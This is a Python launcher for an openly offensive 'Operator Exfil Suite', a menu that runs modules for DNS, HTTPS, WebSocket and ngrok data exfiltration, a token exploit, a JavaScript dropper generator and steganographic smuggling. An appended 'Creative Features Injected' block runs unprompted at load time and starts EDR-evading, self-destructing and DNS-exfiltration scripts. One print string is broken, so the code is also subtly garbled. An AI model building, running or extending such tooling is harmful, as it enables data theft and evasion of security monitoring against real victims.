#!/usr/bin/env python3
import os
import sys
import time

modules = {
    "1": ("DNS Exfiltration", "modules/exfil_dns.py"),
    "2": ("HTTPS Exfiltration", "modules/exfil_https.py"),
    "3": ("WebSocket Exfiltration", "modules/exfil_ws.py"),
    "4": ("Ngrok Tunnel & Beacon", "modules/exfil_ngrok.py"),
    "5": ("Autopilot Routine", "modules/exfil_autopilot.py"),
    "6": ("Token Exploit", "modules/live_token_exploit.sh"),
    "7": ("Sync Exfil Data", "modules/exfil_sync.sh"),
    "8": ("Custom Listener", "modules/exfil_listener.py"),
    "9": ("JS Dropper Generator", "modules/js_dropper.py"),
    "10": ("Stego Archive Smuggler", "modules/exfil_stego.py"),
    "11": ("Volatile Memory Packer", "modules/volatile_packer.py")
}

def banner():
    os.system("clear")
    print("""\033[92m
███████╗██╗  ██╗██╗██╗     ███████╗
██╔════╝██║  ██║██║██║     ██╔════╝
███████╗███████║██║██║     █████╗  
╚════██║██╔══██║██║██║     ██╔══╝  
███████║██║  ██║██║███████╗███████╗
╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
Operator Exfil Suite
\033[0m""")

def menu():
    banner()
    print("Select a module to launch:
")
    for key, (desc, _) in modules.items():
        print(f" [{key}] {desc}")
    print(" [0] Exit")

def run_module(choice):
    if choice in modules:
        name, path = modules[choice]
        print(f"[*] Launching: {name} ...")
        if path.endswith(".py"):
            os.system(f"python3 {path}")
        elif path.endswith(".sh"):
            os.system(f"bash {path}")
        else:
            print("[!] Unknown file type.")
    else:
        print("[!] Invalid selection.")

if __name__ == "__main__":
    while True:
        menu()
        try:
            choice = input("\n> ").strip()
            if choice == "0":
                print("[*] Exiting.")
                break
            run_module(choice)
            input("\n[Return] to go back to menu...")
        except KeyboardInterrupt:
            print("\n[*] Interrupted. Exiting.")
            break


# --- Creative Features Injected ---

import subprocess

def run_creative_ops():
    print("[*] Launching creative evasive routines...")
    try:
        subprocess.Popen(['python3', 'dynamic_dns_exfil.py', 'evadeX'])
        subprocess.Popen(['python3', 'edr_aware_launcher.py'])
        subprocess.Popen(['python3', 'self_destruct_loader.py'])
    except Exception as e:
        print(f"[!] Creative module launch failed: {e}")

run_creative_ops()
